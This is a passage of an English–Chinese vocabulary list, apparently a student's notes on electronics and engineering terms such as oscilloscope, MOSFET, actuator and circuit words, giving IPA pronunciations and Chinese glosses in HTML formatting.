style="color:#fe2c24;">saturate&nbsp;</span>&nbsp;[ˈsætʃəreɪt]使湿透;浸透，渗透;浸透的;饱和的;饱和化合物;饱和脂肪（或脂肪酸）</p>  <p><span style="color:#fe2c24;">apparatus，</span>[ˌæpəˈrætəs]仪器;器械;装置</p>  <p>induced charge感应电荷</p>  <p><span style="color:#fe2c24;">induce&nbsp;</span>&nbsp;[ɪnˈduːs]诱导;引起;导致;</p>  <p>reduce减少</p>  <p>series development级数展开</p>  <p>movement(身体部位的)运动，转动;移动;迁移;转移;活动;</p>  <p>needle针;缝衣针;编织针;注射针;针头;指针;</p>  <p>noodle面条</p>  <p><span style="color:#fe2c24;">numerous&nbsp;</span>[ˈnuːmərəs]很多的;众多的;许多的</p>  <p><span style="color:#fe2c24;">numerical&nbsp;</span>&nbsp;[nuːˈmerɪk(ə)l]数字的，用数字表示的</p>  <p><span style="color:#fe2c24;">alphabetical</span>，[ˌælfəˈbetɪkl]字母，以字母顺序</p>  <p><span style="color:#fe2c24;">alphanumeric&nbsp;</span>&nbsp;[ˌælfənuːˈmerɪk]含有字母和数字的;字母与数字并用的</p>  <p><span style="color:#fe2c24;">jack</span>千斤顶，起重器(换车轮时常用);(电)插孔，插座，插口;塞孔;</p>  <p><span style="color:#fe2c24;">beam&nbsp;</span>[biːm](建筑物的)梁;光线;(电波的)波束;(粒子的)束;</p>  <p>light-beam光束</p>  <p>electron beam电子束</p>  <p>focused注意力集中的;目标明确的</p>  <p><span style="color:#fe2c24;">accelerate&nbsp;</span>&nbsp;[əkˈseləreɪt](使)加速;加快</p>  <p><span style="color:#fe2c24;">acceleration，</span>加速，加快；（车辆）加速能力，加速幅度；加速度</p>  <p><span style="color:#fe2c24;">deflect&nbsp;</span>&nbsp;[dɪˈflekt]<span style="color:#fe2c24;"> 偏转;转移;(尤指击中某物后)偏斜，转向，使偏斜，使转向;</span></p>  <p><span style="color:#fe2c24;">deflection (尤指击中某物后)突然转向，偏斜，偏离</span></p>  <p><span style="color:#fe2c24;">defect </span>&nbsp;[ˈdiːfekt]<span style="color:#fe2c24;">缺点;缺陷;毛病</span></p>  <p><span style="color:#fe2c24;">inflection&nbsp;</span>&nbsp;[ɪnˈflekʃn]弯曲，变形；音调变化</p>  <p>infection ，n.传染;(身体某部位的)感染;传染病</p>  <p><span style="color:#fe2c24;">reflection反射;反映;映像;</span></p>  <p><span style="color:#fe2c24;">reflect反映;映出(影像);反射(声、光、热等);</span></p>  <p><span style="color:#fe2c24;">reflective反思的;沉思的;深思的;(指物体表面)反射热的，反光的;</span></p>  <p><span style="color:#fe2c24;">anode&nbsp;</span>[ˈænoʊd]（在电解池中）阳极；（在原电池中）负极</p>  <p>anodize对(铝等金属)作阳极氧化；阳极处理</p>  <p><span style="color:#fe2c24;">cathode </span>&nbsp;[ˈkæθoʊd]（在电解池中）阴极；（在原电池中）正极</p>  <p>node节点</p>  <p>nodal节的；节点的；交点的；</p>  <p>ray(热或其他能量的)射线;</p>  <p>cathode ray tube阴极射线管</p>  <p>vertical竖的;垂直的;直立的;纵向的;垂直线;垂直位置</p>  <p><span style="color:#fe2c24;">axis&nbsp;</span>&nbsp;[ˈæksɪs]轴(旋转物体假想的中心线);(尤指图表中的)坐标轴;轴心</p>  <p><span style="color:#fe2c24;">reciprocal&nbsp;</span>[rɪˈsɪprək(ə)l]倒数;互惠的;相应的</p>  <p><span style="color:#fe2c24;">superimpose&nbsp;</span>[ˌsuːpərɪmˈpoʊz]叠加;使(图像甲)叠映在(图像乙)上;使重叠;</p>  <p><span style="color:#fe2c24;">overlap&nbsp;</span>&nbsp;[ˌoʊvərˈlæp]重叠;(物体或时间上)部分重叠;交叠;（范围方面）部分重叠</p>  <p>shift转移;改变;转移;转换;变换;</p>  <p>diagram简图;图解;图表;示意图</p>  <p>block diagram框图</p>  <p><span style="color:#fe2c24;">flowchart&nbsp;</span>[ˈfloˌtʃɑrt]流程图</p>  <p><span style="color:#fe2c24;">scale&nbsp;</span>&nbsp;[skeɪl]天平；规模；刻度；比例</p>  <p>small-scale小规模的</p>  <p>dot点，小点;点状物，微小的东西;</p>  <p>pot&nbsp;（烹饪所用圆而深的）锅；（盛食品的）罐，瓶，壶；</p>  <p><span style="color:#fe2c24;">phosphor&nbsp;</span>&nbsp;[ˈfɑsfər]荧光粉</p>  <p>sweep打扫;扫;清扫;扫去;清除;</p>  <p>rapid迅速的;快速的;瞬间的;</p>  <p><span style="color:#fe2c24;">attenuator&nbsp;</span>&nbsp;[əˈtenjueɪtər](信号)衰减器</p>  <p><span style="color:#fe2c24;">attenuation&nbsp;</span>&nbsp;[əˌtenjuˈeɪʃ(ə)n]衰减；变薄；稀释</p>  <p>time-base时基</p>  <p><span style="color:#fe2c24;">contrast&nbsp;</span>&nbsp;[ˈkɑːntræst]明显的差异;对比;对照;</p>  <p>real-time实时的</p>  <p>non-real-time非实时的</p>  <p><span style="color:#fe2c24;">instantaneous&nbsp;</span>&nbsp;[ˌɪnstənˈteɪniəs]立即的;立刻的;瞬间的</p>  <p>instantly立刻;立即;马上</p>  <p>obtain获得;(尤指经努力)赢得;</p>  <p>retain保持;保留;持有;</p>  <p>stand-alone单机；独立的</p>  <p>sample样品，样本；采样，取样;</p>  <p><span style="color:#fe2c24;">apparent&nbsp;</span>&nbsp;[əˈpærənt]显然的;显而易见的;</p>  <p>volt ampere伏安</p>  <p><span style="color:#fe2c24;">ampere </span>&nbsp;[ˈæmpɪr]安培（计算电流强度的标准单位）</p>  <p><span style="color:#fe2c24;">sophisticated&nbsp;</span>&nbsp;[səˈfɪstɪkeɪtɪd]见多识广的，老练的，见过世面的；复杂巧妙的，先进的，精密的；</p>  <p>signal generator信号发生器;信号源;</p>  <p>signal信号;暗号;标志;预示;</p> </blockquote> <blockquote>  <p><span style="color:#fe2c24;">troubleshooting&nbsp;</span>&nbsp;[ˈtrʌblʃuːtɪŋ]故障排除;检修;（为公司、机构等）分析解决（难题）</p>  <p>whereas然而，但是，尽管;</p>  <p>establish创立;设立;建立(尤指正式关系);</p>  <p><span style="color:#fe2c24;">proportion&nbsp;</span>[prəˈpɔːrʃ(ə)n]部分;份额;比例;倍数关系;正确的比例;均衡;</p>  <p>proportional相称的;成比例的;均衡的</p>  <p>proportionally按比例地，相配合地，适当地</p>  <p>proportional integral比例积分</p>  <p><span style="color:#fe2c24;">approximately&nbsp;</span>[əˈprɑːksɪmətli]大概;大约;</p>  <p><span style="color:#fe2c24;">approximate&nbsp;</span>[əˈprɑːksɪmət]近似;接近;近似计算;概略估算;近似的;大约的;接近的</p>  <p><span style="color:#fe2c24;">appropriate&nbsp;</span>&nbsp;[əˈproʊpriət]适当的;合适的;恰当的</p>  <p><span style="color:#fe2c24;">appropriately</span>适当地;合适地;恰当地</p>  <p>successive-approximation逐次逼近</p>  <p><span style="color:#fe2c24;">successive&nbsp;</span>&nbsp;[səkˈsesɪv]连续的;接连的;相继的</p>  <p><span style="color:#fe2c24;">succession</span>一连串;继承;继任;一系列;</p>  <p>backward向后的，朝后的;向后，朝后;往回，往前面;</p>  <p>ideal完美的;理想的;最合适的;想象的;</p>  <p>idle空闲的</p>  <p>microamp微安uA</p>  <p>breakdown崩溃;(车辆或机器的)故障，损坏;(关系的)破裂</p>  <p>breakthrough重大进展，突破;突破点</p>  <p><span style="color:#fe2c24;">irrelevant&nbsp;</span>[ɪˈreləvənt]无关的;无关紧要的;不相关的</p>  <p><span style="color:#fe2c24;">relevant</span>相关的;切题的;有价值的;有意义的</p>  <p>dimly暗淡地;昏暗地;模糊地</p>  <p>ratio比率;比例</p>  <p>radio无线电广播;无线电广播节目;收音机;</p>  <p>video视频</p>  <p>audio音频</p>  <p>gain获得；增加；增益</p>  <p>presently目前;现在;此刻;眼下;</p>  <p>microcircuit微电路</p>  <p><span style="color:#fe2c24;">acronym&nbsp;</span>&nbsp;[ˈækrənɪm]缩略语;首字母缩略词</p>  <p>metel-oxide金属氧化物</p>  <p>denote标志;预示;象征;表示;意指</p>  <p>denotation&nbsp;指称意义，本义</p>  <p>n-channel N沟道</p>  <p>p-channel P沟道</p>  <p><span style="color:#fe2c24;">enhancement&nbsp;&nbsp;</span>&nbsp;[ɪnˈhænsmənt]提高;增加;增强</p>  <p>exhaust耗尽;使筋疲力尽;使疲惫不堪;</p>  <p>exhausted筋疲力尽的;疲惫不堪的;用完的;耗尽的;枯竭的</p>  <p>four-terminal四端</p>  <p><span style="color:#fe2c24;">substrate&nbsp;</span>&nbsp;[ˈsʌbstreɪt]基底;底物;底层;基层</p>  <p><span style="color:#fe2c24;">sake&nbsp;</span>&nbsp;[seɪk]目的;利益;</p>  <p>simplicity简单(性);淳朴;质朴;容易(性);</p>  <p>seperate分离;S端子;端子;</p>  <p>midway中途;居中的，中途的</p>  <p>bypass旁路;旁通;绕过;支路;</p>  <p>critical批评的;关键的;</p>  <p><span style="color:#fe2c24;">venerable&nbsp;</span>&nbsp;[ˈvenərəb(ə)l]可敬的;(因年高、显要、智慧等)令人尊重的</p>  <p>rail-to-rail轨到轨;轨对轨;</p>  <p><span style="color:#fe2c24;">distortion&nbsp;</span>&nbsp;[dɪˈstɔːrʃ(ə)n]扭曲;歪曲;曲解;失真;变形</p>  <p><span style="color:#fe2c24;">exceed&nbsp;</span>&nbsp;[ɪkˈsiːd]超过(数量);超越(法律、命令等)的限制</p>  <p><span style="color:#fe2c24;">exert &nbsp;</span>[ɪɡˈzɜːrt]发挥;施加;行使;运用;</p>  <p><span style="color:#fe2c24;">alternative&nbsp;</span>&nbsp;[ɔːlˈtɜːrnətɪv]可供替代的;另类的;</p>  <p>alter改变;(使)更改;改动;</p>  <p>alert警觉的;警惕的;戒备的;意识到;注意到;警戒;戒备;警惕;警报</p>  <p>clerk店员;职员;文书;簿记员;</p>  <p><span style="color:#fe2c24;">illustration </span>&nbsp;[ˌɪləˈstreɪʃ(ə)n]<span style="color:#fe2c24;">插图;图解;图示;(书、杂志等中的)图表;例释;(说明事实的)示例</span></p>  <p><span style="color:#fe2c24;">illustrate </span>&nbsp;[ˈɪləstreɪt]<span style="color:#fe2c24;">说明;加插图于;给(书等)做图表;</span></p>  <p><span style="color:#fe2c24;">illuminate&nbsp;</span>&nbsp;[ɪˈluːmɪneɪt]照明;照亮;照射;阐明;解释;</p>  <p>lamp灯</p>  <p><span style="color:#fe2c24;">arrow&nbsp;</span>&nbsp;[ˈæroʊ]箭;箭号;箭头</p>  <p><span style="color:#fe2c24;">bind&nbsp;</span>&nbsp;[baɪnd]绑定;捆绑;系;(用长布条)缠绕;(使)联合在一起，结合;</p>  <p>happen&nbsp;to碰巧</p>  <p>turn on打开</p>  <p>turn off关闭</p>  <p>floating浮动，浮点数</p>  <p>cutoff切断;被截断 (或切下)的东西;停止点;截止点;界限;</p>  <p>pointless无意义的;无目标的;不值得做的</p>  <p>after all毕竟</p>  <p>indirectly间接地；</p>  <p>majority大部分，大多数，过半数，大半;</p>  <p>vast majority绝大部分</p>  <p><span style="color:#fe2c24;">vast&nbsp;</span>&nbsp;[væst]巨大的;辽阔的;庞大的;大量的</p>  <p>vastly极大地</p>  <p><span style="color:#fe2c24;">hefty&nbsp;</span>&nbsp;[ˈhefti]高大健壮的，笨重的;巨大的，很大的</p>  <p>relatively相当程度上;相当地;相对地</p>  <p><span style="color:#fe2c24;">fraction</span>&nbsp;&nbsp;[ˈfrækʃ(ə)n]分数;小数;小部分;少量;一点儿;</p>  <p><span style="color:#fe2c24;">energize&nbsp;</span>[ˈenərdʒaɪz]激励;使充满热情;为…提供电力(或能量);使通电</p>  <p>solar cell太阳能电池</p>  <p>cell牢房;小房间;细胞;电池;单元格</p>  <p><span style="color:#fe2c24;">cellular&nbsp;</span>&nbsp;[ˈseljələr]细胞的;由细胞组成的;(无线电话)蜂窝状的;网状的;</p>  <p>magically魔术般地</p>  <p><span style="color:#fe2c24;">saturation&nbsp;</span>&nbsp;[ˌsætʃəˈreɪʃ(ə)n]饱和;饱和状态;饱和度</p> </blockquote> <blockquote>  <p><span style="color:#fe2c24;">isolation </span>&nbsp;[ˌaɪsəˈleɪʃn]<span style="color:#fe2c24;">隔离，分离;孤立；隔绝，绝缘</span></p>  <p><span style="color:#fe2c24;">isolate隔离;使与世隔绝;隔离的，分离的;孤立的;单独的</span></p>  <p>pulsating &nbsp;[ˈpʌlseɪtɪŋ]脉动的</p>  <p>self contained自包含;自足;自足的;自包含的;独立的</p>  <p>cheapness廉价;便宜;</p>  <p>regulator(速度、温度、压力的)自动调节器;稳压器</p>  <p>common ground公共地</p>  <p>zener diode齐纳二极管</p>  <p>schottky肖基特二极管;肖特基;</p>  <p>flow through流过</p>  <p>slight轻的;轻微的;略微的;细小的;纤细的</p>  <p>slightly轻微地;稍微;略微</p>  <p>sight景象;看见;视力;视觉;视野;名胜;</p>  <p>light光;光线;光亮;照亮;</p>  <p><span style="color:#fe2c24;">insight</span>洞察力;领悟;洞悉;了解</p>  <p>tight牢固的;紧的;不松动的;</p>  <p><span style="color:#fe2c24;">ripple&nbsp;</span>&nbsp;[ˈrɪp(ə)l]涟漪;波纹;细浪;纹波；</p>  <p><span style="color:#fe2c24;">dope&nbsp;</span>&nbsp;[doʊp]麻醉剂;给…用兴奋剂;</p>  <p><span style="color:#fe2c24;">commemorate&nbsp;</span>&nbsp;[kəˈmeməreɪt]纪念;作为…的纪念</p>  <p>nonprofit非营利性;非营利的</p>  <p>associate联合;联想;联系;</p>  <p><span style="color:#fe2c24;">association&nbsp;</span>&nbsp;[əˌsoʊsiˈeɪʃn; əˌsoʊʃiˈeɪʃn]协会;社团;联盟;联合;合伙</p>  <p>institute研究所;(教育、专业等)机构</p>  <p>institution机构;慈善机构;社会福利机构;</p>  <p>organization组织;团体;机构;</p>  <p>conference会议;研讨会</p>  <p>membership会员;会员资格;成员资格;</p>  <p><span style="color:#fe2c24;">council&nbsp;</span>[ˈkaʊns(ə)l]委员会，理事会，顾问委员会</p>  <p>nearly几乎;差不多;将近</p>  <p>popularly普遍地;广泛地;一般地;</p>  <p><span style="color:#fe2c24;">authority&nbsp;</span>&nbsp;[əˈθɔːrəti]权威;权力;</p>  <p><span style="color:#fe2c24;">biomedical</span>生物医学的</p>  <p><span style="color:#fe2c24;">consensus&nbsp;</span>&nbsp;[kənˈsensəs]一致的意见;共识</p>  <p>consensus-based基于共识</p>  <p>annually一年一次地</p>  <p><span style="color:#fe2c24;">span&nbsp;</span>[spæn]跨度，范围;持续时间;</p>  <p>vitality生命力;活力;热情&nbsp;[kənˈsensəs]</p>  <p>vital&nbsp;至关重要的，必不可少的;生命的;对…极重要的;维持生命所必需的;生气勃勃的，充满生机的;热情洋溢的;生命统计的，生死统计的;致命的，生死攸关的;（常用复数）（心、脑、肝、肺、肾等）维持生命的重要器官;重要部分，要害</p>  <p><span style="color:#fe2c24;">prestigious&nbsp;</span>&nbsp;[preˈstiːdʒəs]有声望的;有威望的;声誉高的</p>  <p>recognition认出;认识;识别;承认;认可;</p>  <p>achievement成就;成绩;功绩;</p>  <p>achieve实现;完成;(凭长期努力)达到(某目标、地位、标准);成功</p>  <p>leadership领导;领导地位;领导才能;</p>  <p>participation参加;参与</p>  <p>movable可移动的;活动的;不固定的</p>  <p><span style="color:#fe2c24;">motorized&nbsp;</span>&nbsp;[ˈmoʊtəraɪzd]有引擎的;机动的;使用机动车的;</p>  <p>wheel轮;车轮;轮子;</p>  <p>dozen(一)打;十几个;十多个;十二个;</p>  <p>tickle 挠痒痒;胳肢;逗乐;呵痒;</p>  <p><span style="color:#fe2c24;">segment&nbsp;</span>&nbsp;[ˈseɡmənt]部分;份;片;段;</p>  <p>bone骨，骨头;</p>  <p><span style="color:#fe2c24;">joint&nbsp; </span>&nbsp;[dʒɔɪnt]<span style="color:#fe2c24;">共同的;联合的;关节;(尤指构成角的)接头;接合处;</span></p>  <p><span style="color:#fe2c24;">pivot&nbsp;</span>&nbsp;[ˈpɪvət]支点;枢轴;中心点;</p>  <p><span style="color:#fe2c24;">actuator&nbsp;</span>[ˈæktʃueɪtər]致动（促动，激励，调节）器；传动（装置，机构）；拖动装置；马达；</p>  <p><span style="color:#fe2c24;">solenoid&nbsp;</span>&nbsp;[ˈsɑːlənɔɪdˌˈsoʊlənɔɪd]螺线管(通电时产生磁场)</p>  <p><span style="color:#fe2c24;">hydraulic&nbsp;</span>&nbsp;[haɪˈdrɔːlɪk]水力的;(通过水管等)液压的;液压驱动的;</p>  <p><span style="color:#fe2c24;">pneumatic </span>[nuːˈmætɪk]充气的;由压缩空气操作的;气动的;风动的</p>  <p>compressed gas压缩气体</p>  <p>air compressor空气压缩机</p>  <p><span style="color:#fe2c24;">compressor&nbsp;</span>[kəmˈpresər]压气机;压缩机</p>  <p>compressed air tank压缩空气罐</p>  <p><span style="color:#fe2c24;">pump&nbsp;</span>&nbsp;[pʌmp]抽水机，泵;打气筒;激发（原子等）</p>  <p><span style="color:#fe2c24;">pressurize&nbsp;</span>[ˈpreʃəraɪz]加压</p>  <p><span style="color:#fe2c24;">fluid </span>&nbsp;[ˈfluːɪd]<span style="color:#fe2c24;">流体;</span>液;液体;</p>  <p><span style="color:#fe2c24;">liquid </span>[ˈlɪkwɪd]<span style="color:#fe2c24;">液体;</span>液体的</p>  <p>solid&nbsp;坚硬的；固体的，固态的；结实的，牢固的；固体；固体食物；</p>  <p>first of all首先</p>  <p><span style="color:#fe2c24;">manipulate&nbsp;</span>&nbsp;[məˈnɪpjuleɪt]操纵;(暗中)控制;影响;(熟练地)操作;</p>  <p><span style="color:#fe2c24;">valve&nbsp;</span>&nbsp;[vælv]阀;阀门;活门;气门;</p>  <p>robotic机器人的;像机器人的;</p>  <p>monitor&nbsp;班长;监视器;监控器;显示屏;</p>  <p>motion运动;移动;动;</p>  <p>emotion情绪</p>  <p><span style="color:#fe2c24;">attached&nbsp;</span>[əˈtætʃt]附属的</p>  <p><span style="color:#fe2c24;">attach&nbsp;</span>&nbsp;[əˈtætʃ]贴上;重视;把…固定，把…附(在…上);</p>  <p>programmable程控的;可编程序的</p>  <p>reprogrammable可重复编程;可再编程</p>  <p><span style="color:#fe2c24;">aeronautics&nbsp;</span>&nbsp;[ˌerəˈnɔːtɪks]航空学;飞行学;飞行术</p>  <p>tiny极小的;微小的;微量的</p>  <p>structure结构;构造;结构体;</p>  <p><span style="color:#fe2c24;">replicate&nbsp;</span>[ˈreplɪkeɪt]复制;(精确地)仿制;类似于repeat;复制品；</p>  <p><span style="color:#fe2c24;">duplicate&nbsp;</span>&nbsp;[ˈduːplɪkeɪt]复制;复印;复写;复制品;副本</p>  <p><span style="color:#fe2c24;">step-motor</span>步进电机</p>  <p>exact准确的;精确的;严谨的;</p>  <p>increment增量;增加</p>  <p><span style="color:#fe2c24;">infrared&nbsp;</span>&nbsp;[ˌɪnfrəˈred]红外线的;使用红外线的</p>  <p><span style="color:#fe2c24;">puppet&nbsp;</span>&nbsp;[ˈpʌpɪt]木偶;傀儡</p>  <p><span style="color:#fe2c24;">volcano&nbsp;</span>&nbsp;[vɑːlˈkeɪnoʊ]火山</p>  <p><span style="color:#fe2c24;">interact&nbsp;</span>&nbsp;[ˌɪntərˈækt]互动;相互作用;交流;相互影响;沟通;合作</p>  <p>interactive互动的;互相作用的</p>  <p>interaction相互作用;相互影响（作用，制约，配合）</p>  <p><span style="color:#fe2c24;">interrelate&nbsp;</span>[ˌɪntərɪˈleɪt]相互关联（或影响）</p>  <p><span style="color:#fe2c24;">interchangeably</span>可交替地；可互换地</p>  <p>socially社会上;交际上;</p>  <p>deep sea深海</p>  <p>recognize认出;认识;承认;</p>  <p><span style="color:#fe2c24;">visualization&nbsp;</span>&nbsp;[ˌvɪʒuələˈzeɪʃn]可视化</p>  <p><span style="color:#fe2c24;">visual&nbsp;</span>&nbsp;[ˈvɪʒuəl]视力的;视觉的</p>  <p>visual cue视觉提示;</p>  <p>cue暗示;提示;信号;</p>  <p><span style="color:#fe2c24;">foundation&nbsp;</span>&nbsp;[faʊnˈdeɪʃ(ə)n]地基;房基;基础;基本原理;建立，创办；</p>  <p><span style="color:#fe2c24;">fundamental&nbsp;</span>&nbsp;[ˌfʌndəˈment(ə)l]基本的;十分重大的;根本的;基础的;基本规律;根本法则;</p>  <p>breathe呼吸;</p>  <p>constantly不断地;一直;始终</p>  <p><span style="color:#fe2c24;">constant&nbsp;</span>&nbsp;[ˈkɑːnstənt]常数;常量;恒定的;不变的;</p>  <p>instinctively本能地，凭直觉</p>  <p>instinct&nbsp;本能，天性；直觉；天分，天赋</p>  <p><span style="color:#fe2c24;">refrigerator&nbsp;</span>&nbsp;[rɪˈfrɪdʒəreɪtər]<span style="color:#fe2c24;">&nbsp;</span>(电)冰箱</p>  <p><span style="color:#fe2c24;">refrigeration&nbsp;</span>制冷;冷藏，冷冻</p>  <p><span style="color:#fe2c24;">refrigerant&nbsp;</span>&nbsp;[rɪˈfrɪdʒərənt]制冷剂，冷冻剂</p>  <p><span style="color:#fe2c24;">entertainment&nbsp;</span>[ˌentərˈteɪnmənt]娱乐活动;招待;款待;娱乐</p>  <p>somewhat有点，稍微</p>  <p><span style="color:#fe2c24;">cumbersome&nbsp;</span>&nbsp;[ˈkʌmbərsəm]笨重的；繁琐的，复杂的；（话语或措词）冗长的</p>  <p><span style="color:#fe2c24;">diesel&nbsp;</span>&nbsp;[ˈdiːz(ə)l]柴油机;柴油;</p>  <p><span style="color:#fe2c24;">turbine&nbsp;</span>&nbsp;[ˈtɜːrbaɪn]涡轮;汽轮机;涡轮机</p>  <p><span style="color:#fe2c24;">steam&nbsp;</span>&nbsp;[stiːm]水蒸气, 蒸汽, 水汽</p>  <p><span style="color:#fe2c24;">nuclear reactor（尤指用于发电的）核反应堆</span></p>  <p><span style="color:#fe2c24;">nuclear&nbsp;</span>&nbsp;[ˈnuːkliər]原子能的，核能的;</p>  <p><span style="color:#fe2c24;">nucleus&nbsp;</span>[ˈnuːkliəs]核;原子核;细胞核;核心;</p>  <p>household家庭;家庭的，家内的</p>  <p><span style="color:#fe2c24;">outlet&nbsp;</span>&nbsp;[ˈaʊtlet]出口;(感情、思想、精力发泄的)出路;</p>  <p>simultaneous &nbsp;[ˌsaɪmlˈteɪniəs]同时的;同步的;同时发生(或进行)的</p>  <p>simultaneously同时;</p>  <p><span style="color:#fe2c24;">simulate </span>[ˈsɪmjuleɪt]<span style="color:#fe2c24;">(用计算机或模型等)模拟;模仿;仿真</span></p>  <p><span style="color:#fe2c24;">simulation模拟;仿真;假装;冒充</span></p>  <p><span style="color:#fe2c24;">simulator模拟器;仿真器</span></p>  <p><span style="color:#fe2c24;">emulate&nbsp;</span>&nbsp;[ˈemjuleɪt]仿效, 模仿;仿真;</p>  <p><span style="color:#fe2c24;">offset&nbsp;</span>&nbsp;[ˈɔːfset]抵消;弥补;补偿</p>  <p>degree度;程度;度数(角的量度单位或温度单位);（大学）学位;</p>  <p><span style="color:#fe2c24;">substation </span>&nbsp;[ˈsʌbsteɪʃn]分局；变电所；分所；分台</p>  <p>tower塔</p>  <p>obvious明显的;显然的;</p>  <p>stainless不锈钢的，不生锈的;</p>  <p>steel钢;钢铁工业;</p>  <p>steal窃取;偷</p>  <p>split(使)分裂(成不同的派别);使分开(成为几个部分);</p>  <p>circuit breaker断路器</p>  <p><span style="color:#fe2c24;">cable&nbsp;</span>&nbsp;[ˈkeɪb(ə)l]电缆</p>  <p>tap轻敲;水龙头;</p>  <p>drum鼓;击鼓</p>  <p>current-limiting限流的</p>  <p>kirchhoff's law基尔霍夫定律;</p>  <p>flip(使)快速翻转，迅速翻动;</p>  <p><span style="color:#fe2c24;">flip-flop</span>触发器</p>  <p>latch门闩;插销;碰锁;锁存器</p>  <p>flashlight手电筒;手电</p>  <p>bulb电灯泡;</p>  <p><span style="color:#fe2c24;">album&nbsp;</span>&nbsp;[ˈælbəm]专辑;相册;影集;</p>  <p>flashbulb闪光灯</p>  <p>battery电池;</p>  <p><span style="color:#fe2c24;">watt瓦特;瓦(电功率单位)</span></p>  <p><span style="color:#fe2c24;">joule </span>&nbsp;[dʒuːl]<span style="color:#fe2c24;">焦耳(能量或功的单位)</span></p>  <p><span style="color:#fe2c24;">wattage瓦数;瓦特数</span></p>  <p>megawatt兆瓦，百万瓦特(电能计量单位)</p>  <p>megabyte兆字节;百万字节(计算机存储单位，相当于2²⁰字节)</p>  <p>shrinkage 收缩；减低</p>  <p><span style="color:#fe2c24;">shrink&nbsp;</span>&nbsp;[ʃrɪŋk]收缩;退缩;畏缩;</p>  <p><span style="color:#fe2c24;">frontier &nbsp;</span>[frʌnˈtɪr]边界;边境;国界;边缘</p>  <p>voltage source独立电压源;电源;电压源;</p>  <p>element要素;基本部分;</p>  <p>ampere安，安培(电流单位，缩略形式为 amp)</p>  <p>capital 首都;资本，资金；资本家，资方；大写的；</p>  <p>Greek希腊人;希腊语;古希腊人</p>  <p>German德国的;德国人;德语</p>  <p>physicist物理学家;</p>  <p>physical limit物理极限</p>  <p>physical身体的;物理学的</p>  <p><span style="color:#fe2c24;">interconnection&nbsp;</span>&nbsp;[ˌɪntərkəˈnekʃn]相互关联;相互联系</p>  <p><span style="color:#fe2c24;">conservation </span>&nbsp;[ˌkɑːnsərˈveɪʃ(ə)n]保护，保存；节约;守恒定律</p>  <p><span style="color:#fe2c24;">conserve&nbsp;</span>&nbsp;[kənˈsɜːrv]保护，保存；节省，节约；使（量，如能量、质量）守恒；</p>  <p>equivalent相等的;(价值、数量、意义、重要性等)相同的;等效的</p>  <p><span style="color:#fe2c24;">circumstance&nbsp;</span>[ˈsɜːrkəmstæns]条件;环境;状况;境况;境遇;</p>  <p><span style="color:#fe2c24;">traverse </span>[trəˈvɜːrs]横过;横越;穿过;</p>  <p><span style="color:#fe2c24;">opposite&nbsp;</span>&nbsp;[ˈɑːpəzɪt]对面的;另一边的;相反的;</p>  <p><span style="color:#fe2c24;">oppose&nbsp;</span>&nbsp;[əˈpoʊz]反对(计划、政策等);抵制;阻挠;</p>  <p>loop环;环路</p>  <p>minor少数的;轻微的;较小的</p>  <p><span style="color:#fe2c24;">minus&nbsp;</span>[ˈmaɪnəs]减;负的;小于零的;</p>  <p>plus加</p>  <p><span style="color:#fe2c24;">accomplish</span>&nbsp;[əˈkɑːmplɪʃ]完成</p>  <p>accomplished完成的</p>  <p><span style="color:#fe2c24;">accomplishment</span>成就;成绩;</p>  <p>policy政策;方针;原则;为人之道;保险单</p>  <p>principle道德原则;行为准则;规范;法则;原则;</p>  <p><span style="color:#fe2c24;">principal&nbsp;</span>&nbsp;[ˈprɪnsəp(ə)l]最重要的;主要的</p>  <p>protocol协议;议定书;礼仪;外交礼节;条约草案;</p>  <p>nonetheless尽管如此</p>  <p><span style="color:#fe2c24;">complicated&nbsp;</span>&nbsp;[ˈkɑːmplɪkeɪtɪd]复杂的;难懂的</p>  <p><span style="color:#fe2c24;">complex&nbsp;</span>&nbsp;[kəmˈpleks]复杂的;难懂的;费解的;</p>  <p>complexity复杂性;难懂;难题;难以理解的局势</p>  <p>conveniently方便地;便利地;顺利;通常</p>  <p><span style="color:#fe2c24;">convenience&nbsp;</span>[kənˈviːniəns]方便;适宜;便利;</p>  <p><span style="color:#fe2c24;">convenient&nbsp;</span>&nbsp;[kənˈviːniənt]实用的;便利的;方便的;省事的;</p>  <p><span style="color:#fe2c24;">conventional&nbsp;</span>&nbsp;[kənˈvenʃən(ə)l]依照惯例的;遵循习俗的;墨守成规的;</p>  <p><span style="color:#fe2c24;">approach&nbsp;</span>[əˈproʊtʃ]方法;靠近;</p>  <p>mesh网格;网状物;网状织物;</p>  <p>nonplanar空间的；非平面的；曲线的</p>  <p>impulse脉冲;冲击;推动，驱使;冲力，推力;</p>  <p><span style="color:#fe2c24;">irregular&nbsp;</span>&nbsp;[ɪˈreɡjələr]不整齐的;不平整的;参差不齐的;不规则的;</p>  <p><span style="color:#fe2c24;">transient</span>转瞬即逝的;短暂的;</p>  <p><span style="color:#fe2c24;">repetitive&nbsp;</span>&nbsp;[rɪˈpetətɪv]重复的;</p>  <p><span style="color:#fe2c24;">ubiquitous &nbsp;</span>[juːˈbɪkwɪtəs]无处不在的;十分普遍的</p>  <p>conclusion 结论;推论;</p>  <p><span style="color:#fe2c24;">magnitude</span>巨大;重大;重要性;</p>  <p><span style="color:#fe2c24;">angle</span>角;斜角;角度;</p>  <p>steady state稳定态;恒定状态;</p> </blockquote> <blockquote>  <p>bimetallic双金属的</p>  <p><span style="color:#fe2c24;">strip&nbsp;</span>&nbsp;[strɪp](纸、金属、织物等)条，带;剥去，除去</p>  <p>contact联系，联络;</p>  <p>contactless(信用卡或支付系统)非接触式的</p>  <p><span style="color:#fe2c24;">magnetize&nbsp;</span>[ˈmæɡnətaɪz]磁化;使有磁性;</p>  <p>magnetism磁性;磁力;</p>  <p>linkage连接;联系;链环;连锁;联动装置</p>  <p><span style="color:#fe2c24;">tilt&nbsp;</span>&nbsp;[tɪlt](使)倾斜，倾侧;</p>  <p>shut off关闭;关上;使停止运转;</p>  <p><span style="color:#fe2c24;">transparent&nbsp;</span>[trænsˈpærənt]透明的;清澈的;易识破的;易看穿的;</p>  <p><span style="color:#fe2c24;">transparency</span>透明度;透明;透明性;</p>  <p><span style="color:#fe2c24;">produce&nbsp;</span>&nbsp;[prəˈduːs]生产;制造;生长;出产</p>  <p><span style="color:#fe2c24;">reproduce</span>复制;再现;繁殖;再生产</p>  <p>mass-produced大规模生产的；批量生产的</p>  <p>valley山谷;谷;</p>  <p><span style="color:#fe2c24;">loudness</span>响度，音量</p>  <p>carrier wave（电信）载波;缩写词为CW</p>  <p><span style="color:#fe2c24;">arbitrary&nbsp;</span>&nbsp;[ˈɑːrbɪtreri]任意的;武断的;</p>  <p><span 